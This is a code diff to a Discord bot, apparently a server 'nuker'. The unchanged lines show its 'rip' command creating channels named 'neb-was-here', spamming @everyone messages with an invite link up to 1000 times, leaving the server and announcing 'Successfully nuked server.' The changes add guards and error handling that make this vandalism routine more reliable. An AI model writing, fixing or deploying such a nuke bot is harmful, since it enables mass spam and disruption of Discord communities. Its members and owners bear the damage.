@@ -228,6 +228,13 @@ client.on('messageCreate', async (message) => {
   // ===== RIP COMMAND =====
   if (command === 'rip') {
     const guild = message.guild;
+
+    if (!guild || !guild.available) {
+      return message.channel?.send
+        ? await message.channel.send('❌ Already left or unavailable.')
+        : console.warn('Tried to send message to deleted channel');
+    }
+
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
     const channelName = 'neb-was-here';
 
@@ -333,7 +340,10 @@ client.on('messageCreate', async (message) => {
 
       if (createdChannels.length === 0) {
         console.error('❌ No channels were created. Aborting spam.');
-        return message.channel.send('❌ Could not create any channels. Aborting.');
+        if (message.channel && message.channel.id) {
+          await message.channel.send('❌ Could not create any channels. Aborting.');
+        }
+        return;
       }
 
       // Step 6: Spam 20 messages per channel, up to 1000 total
@@ -341,7 +351,10 @@ client.on('messageCreate', async (message) => {
 
       if (validChannels.length === 0) {
         console.error('❌ No valid channels to spam.');
-        return message.channel.send('❌ No valid channels to spam.');
+        if (message.channel && message.channel.id) {
+          await message.channel.send('❌ No valid channels to spam.');
+        }
+        return;
       }
 
       let sent = 0;
@@ -370,17 +383,23 @@ client.on('messageCreate', async (message) => {
       // Step 7: Leave server safely
       await safeLeaveGuild(guild);
 
-      if (!didSomething) {
-        console.error('🚫 Could not perform any actions on this server.');
-        await message.channel.send('🚫 Could not perform any actions on this server.');
-      } else {
-        console.log('✅ Successfully completed operation.');
-        await message.channel.send('✅ Successfully nuked server.');
+      if (message.channel && message.channel.id) {
+        if (!didSomething) {
+          console.error('🚫 Could not perform any actions on this server.');
+          await message.channel.send('🚫 Could not perform any actions on this server.');
+        } else {
+          console.log('✅ Successfully completed operation.');
+          await message.channel.send('✅ Successfully nuked server.');
+        }
       }
 
     } catch (err) {
       console.error('🚨 Critical error during operation:', err.message);
-      await message.channel.send(`❌ Error occurred: ${err.message}`);
+      if (message.channel && message.channel.id) {
+        await message.channel.send(`❌ Error occurred: ${err.message}`);
+      } else {
+        console.warn('Could not send error message: Channel no longer exists');
+      }
     }
   }
 });
